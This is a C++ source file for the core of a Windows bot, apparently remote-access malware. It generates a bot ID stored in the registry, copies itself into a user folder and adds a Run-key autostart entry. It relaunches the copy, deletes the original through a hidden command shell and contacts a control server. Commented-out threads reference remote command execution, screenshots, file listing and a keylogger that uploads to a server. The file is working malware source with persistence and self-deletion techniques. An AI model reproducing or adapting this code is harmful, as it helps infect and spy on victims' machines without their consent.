#include "core.h"

CORE_DATA coreData;
/*
	Initial

	RETURN error
*/
DWORD Core::init(void){ return 0; }

/*
	Uninitial
*/
DWORD Core::uninit(void){ return 0; }

/*
	Disappear bot
	
	RETURN error
*/
DWORD Core::_selfDelete(){
	SHELLEXECUTEINFO sei;

	TCHAR szModule[MAX_PATH],
		szComspec[MAX_PATH],
		szParams[MAX_PATH];

	// get file path names:
	if (
		(CWA(kernel32,GetModuleFileName)(0, szModule, MAX_PATH) != 0) &&
		(CWA(kernel32,GetShortPathName)(szModule, szModule, MAX_PATH) != 0) &&
		(CWA(kernel32,GetEnvironmentVariable)(L"COMSPEC", szComspec, MAX_PATH) != 0)
		)
	{
		wprintf(L"GetModuleFileName %s\r\n", szModule);
		wprintf(L"GetShortPathName %s\r\n", szModule);
		wprintf(L"GetEnvironmentVariable %s\r\n", szComspec);
		// set command shell parameters
		lstrcpy(szParams, L"/c del ");
		lstrcat(szParams, szModule);
		lstrcat(szParams, L" > nul");

		// set struct members
		sei.cbSize = sizeof(sei);
		sei.hwnd = 0;
		sei.lpVerb = L"Open";
		sei.lpFile = szComspec;
		sei.lpParameters = szParams;
		sei.lpDirectory = 0;
		sei.nShow = SW_HIDE;
		sei.fMask = SEE_MASK_NOCLOSEPROCESS;

		// increase resource allocation to program
		SetPriorityClass(GetCurrentProcess(),
			REALTIME_PRIORITY_CLASS);
		SetThreadPriority(GetCurrentThread(),
			THREAD_PRIORITY_TIME_CRITICAL);

		// invoke command shell
		if (ShellExecuteEx(&sei))
		{
			// suppress command shell process until program exits
			SetPriorityClass(sei.hProcess, IDLE_PRIORITY_CLASS);
			SetProcessPriorityBoost(sei.hProcess, TRUE);

			// notify explorer shell of deletion
			SHChangeNotify(SHCNE_DELETE, SHCNF_PATH, szModule, 0);
			return TRUE;
		}
		else // if error, normalize allocation
		{
			printf("ShellExecuteEx error: %d\r\n", GetLastError());
			SetPriorityClass(GetCurrentProcess(),
				NORMAL_PRIORITY_CLASS);
			SetThreadPriority(GetCurrentThread(),
				THREAD_PRIORITY_NORMAL);
		}
	}
	return FALSE;
}

/*
	Write registry data, copy bot into temp folder and make bot auto start with windows

	RETURN error
*/
DWORD Core::_install(){ 
	// get bot id in registry

	BYTE* pcTempID = new BYTE[MAX_BOT_ID_LEN];
	CWA(kernel32, ZeroMemory)(pcTempID, sizeof(pcTempID));
	DWORD dwResult = Registry::_readFromRegA(pcTempID, MAX_BOT_ID_LEN, 
		HKEY_CURRENT_USER, coreData.coreConfig.reg.KEY_PATH, coreData.coreConfig.reg.KEY_NAME);
	if (strlen((char*)pcTempID) >= 32){// bot id exist
		printf("Bot ID exist\r\n");
		// update bot id to bot
		strcpy_s(coreData.cBotID, sizeof(coreData.cBotID), (char*)pcTempID);
		printf("Bot id exist: %s\r\n", coreData.cBotID);
	}else{
		printf("Bot ID not exist\r\n");
		// create bot id

		char dataHash[1024];
		//char time[MAX_TIME];
		char user[MAX_USER_NAME];
		char os[MAX_OS_NAME];
		//Time::getTime(dataHash);
		User::_getUserName(user);
		OS::_getOS(os);
		//printf(data)
		sprintf_s(dataHash, 1024, "%s %s %s", User::_getUserName(), OS::_getOS(), Time::getTime());
		printf("dataHASH: %s\r\n", dataHash);
		Crypter::_MD5HASH(pcTempID, 32, (BYTE*)dataHash, strlen(dataHash));
		
		// update bot id to bot
		strcpy_s(coreData.cBotID, sizeof(coreData.cBotID), (char*)pcTempID);
		printf("Created bot id: %s\r\n", coreData.cBotID);

		// write bot id to registry
		Registry::_writeDataToRegA(coreData.cBotID, strlen(coreData.cBotID),
			HKEY_CURRENT_USER, coreData.coreConfig.reg.KEY_PATH, coreData.coreConfig.reg.KEY_NAME);
		
	}

	// if bot executatble is already in temporary folder, continue to run, or self delete and run file in that folder
	if (Core::_checkInTemp()==FALSE){
		printf("out temp\r\n");
		char user[MAX_USER_NAME];
		User::_getUserName(user);

		char destFile[1024];
		// check windows version to get where to store file
		if (OS::_isWindowsXPAndBellow() == false){
			sprintf_s(destFile, coreData.coreConfig.reg.COPY_PATH, user);
			printf("autorun 6x: %s\r\n", destFile);
		}
		else{
			sprintf_s(destFile, coreData.coreConfig.reg.COPY_PATH, user);
			printf("autorun 5x: %s\r\n", destFile);
		}
		// copy executable file to temporary folder
		wchar_t szFilePath[1024];
		GetModuleFileNameW(NULL, szFilePath, 1024);
		wchar_t *destFileW = StringConverter::chartowchar_t(destFile);

		if (File::_fileExist(destFileW) == TRUE){
			File::_removeFile(destFileW);
			printf("Deleted file\r\n");
		}
		dwResult = CWA(kernel32, CopyFileW)(szFilePath, destFileW, FALSE);

		if (dwResult == 0){
			printf("CopyFile Error: %d\r\n", dwResult);
		}
		// write key to registry to start with windows
		wchar_t *AUTORUN_PATHW = StringConverter::chartowchar_t(coreData.coreConfig.reg.AUTORUN_PATH);
		wchar_t *AUTORUN_NAMEW = StringConverter::chartowchar_t(coreData.coreConfig.reg.AUTORUN_NAME);
		Registry::_writeAutoStartW(destFileW, HKEY_CURRENT_USER, AUTORUN_PATHW, AUTORUN_NAMEW);
		free(destFileW);
		free(AUTORUN_NAMEW);
		free(AUTORUN_PATHW);

		// run new copied file
		PROCESS_INFORMATION pi;
		STARTUPINFOA si;
		ZeroMemory(&si, sizeof(si));
		si.cb = sizeof(si);
		ZeroMemory(&pi, sizeof(pi));
		/**/
		if (!CreateProcessA(destFile, NULL, NULL, NULL, false, 0, NULL, NULL, &si, &pi)) {
			printf("Could not run the program: %d %s\r\n", GetLastError(), destFile);
		}
		// self delete file
		Core::_selfDelete();
	}else{
		printf("in temp\r\n");
		Core::_run();
	}
	return 0; 
}
DWORD Core::_run(){
	RemoteScript::_firstHello(&coreData);
	//HANDLE hDistraction = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Distraction::action,bot_id,0,0);
	/*
	HANDLE hCheckConnect = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)RemoteScript::getCommand, (LPVOID)&coreData, 0, 0);
	HANDLE hCommandLine = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)RemoteScript::ExcecuteCmd, (LPVOID)&coreData, 0, 0);
	/*
	HANDLE hScreenShot = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)RemoteScript::CaptureScreen, (LPVOID)&coreData, 0, 0);
	HANDLE hListFile = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)RemoteScript::ListFile, (LPVOID)&coreData, 0, 0);
	HANDLE hKeyLog = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)KeyLogger::install, NULL, 0, 0);
	HANDLE hKeyLog2 = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)KeyLogger::uploadToServer, (LPVOID)&coreData, 0, 0);

	WaitForSingleObject(hCheckConnect, INFINITE);
	WaitForSingleObject(hCommandLine, INFINITE);
	/*

	WaitForSingleObject(hScreenShot, INFINITE);
	WaitForSingleObject(hListFile, INFINITE);
	WaitForSingleObject(hKeyLog, INFINITE);
	WaitForSingleObject(hKeyLog2, INFINITE);

	CloseHandle(hCheckConnect);
	CloseHandle(hCommandLine);
	/*

	CloseHandle(hScreenShot);
	CloseHandle(hListFile);
	CloseHandle(hKeyLog);
	CloseHandle(hKeyLog2);
	*/
	//Sleep(5000);
	return 0;
}
BOOL Core::_checkInTemp(){
	BOOL bCheck = TRUE;
	char szFilePath[1024];
	GetModuleFileNameA(NULL, szFilePath, 1024);

	char user[MAX_USER_NAME];
	User::_getUserName(user);
	char destFile[1024];
	// check windows version to get where to store file
	if (OS::_isWindowsXPAndBellow() == false){
		sprintf_s(destFile, coreData.coreConfig.reg.COPY_PATH, user);
		printf("autorun 6x: %s\r\n", destFile);
	}
	else{
		sprintf_s(destFile, coreData.coreConfig.reg.COPY_PATH, user);
		printf("autorun 5x: %s\r\n", destFile);
	}

	if (strcmp(szFilePath, destFile) != 0){ // file is not in temporary folder
		bCheck = FALSE;
	}
	return TRUE;
}
/*
	Delete registry data, delete all files related and selfdelete => left nothing behind

	RETURN error
*/
DWORD Core::_uninstall(){ return 0; }

/*
	1. Read config in resource to get all information
	2. Start all thread: get command from server, keylog, screenshot, file searching, commandline 
*/
DWORD Core::_action(){
	// 1. Read config in resource to get all information 
	//coreData
	Config config;
	config.loadDataInResource(IDR_MYTEXTFILE, TEXTFILE);
	/*
	for (int i = 0; i < (int)config.getConfig().getListHash().size(); i++){
		HashEntry temp = config.getConfig().getListHash().at(i);
		printf("[%s] %s=%s\r\n", temp.getSection(), temp.getKey(), temp.getValue());
	}
	*/
	coreData.remoteData.ListCommand = ListCommand;

	coreData.hMutex = CreateMutex(
		NULL,              // default security attributes
		FALSE,             // initially not owned
		NULL);             // unnamed mutex

	if (coreData.hMutex == NULL)
	{
		printf("CreateMutex error: %d\n", GetLastError());
		return GetLastError();
	}
	else{
		printf("Create mutex OK\r\n");
	}
	config.loadDataToCoreData(&coreData);
	Core::_install();
	return 0;
}
